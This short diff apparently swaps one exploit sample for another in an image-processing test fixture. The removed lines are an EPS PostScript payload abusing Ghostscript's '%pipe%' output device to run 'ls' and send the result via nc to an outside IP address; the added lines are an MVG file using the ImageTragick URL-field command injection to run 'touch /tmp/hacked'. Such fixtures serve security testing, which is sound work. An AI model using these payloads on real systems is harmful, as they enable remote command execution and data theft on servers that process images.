@@ -1,10 +1,4 @@
-%!PS-Adobe-3.0 EPSF-3.0
-%%BoundingBox: -0 -0 100 100
-
-userdict /setpagedevice undef
-save
-legal
-{ null restore } stopped { pop } if
-{ legal } stopped { pop } if
-restore
-mark /OutputFile (%pipe%ls | nc 157.230.247.125 4444) currentdevice putdeviceprops
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/oops.jpg"|touch "/tmp/hacked)'
+pop graphic-context
